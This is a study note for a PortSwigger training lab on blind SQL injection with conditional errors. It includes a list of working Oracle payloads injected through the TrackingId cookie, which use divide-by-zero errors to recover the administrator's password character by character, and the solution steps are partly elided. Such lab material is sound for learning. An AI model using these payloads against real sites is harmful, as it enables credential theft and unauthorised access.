# Lab: Blind SQL injection with conditional errors

**Official lab:** [Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

## Lab idea

Practices reasoning from database errors that occur only when a tested condition is true, even though query results are not displayed. The focus is interpreting an error/no-error response as a blind SQLi signal.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, appending a single quotation mark to it: TrackingId=xyz' Verify that an error message is received.
3. Now change it to two quotation marks: TrackingId=xyz'' Verify that the error disappears.
4. You now need to confirm that the server is interpreting the injection as a SQL query i.e.
- …
6. Launch the modified attack, review the results, and note the character at the second offset.
7. Continue this process testing offset 3, 4, and so on, until you have the whole password.
8. In the browser, click "My account" to open the login page.

## Payloads / key values
- `TrackingId`
- `TrackingId=xyz`
- `TrackingId=xyz'`
- `TrackingId=xyz''`
- `TrackingId=xyz'||(SELECT '')||'`
- `TrackingId=xyz'||(SELECT '' FROM dual)||'`
- `SELECT`
- `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
- `users`
- `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
- `WHERE ROWNUM = 1`
- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- `CASE`
- `1=1`
- `1=2`
- `true`
- `administrator`
- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `SUBSTR()`
- `a`
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

## Official source
- [PortSwigger Academy: Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
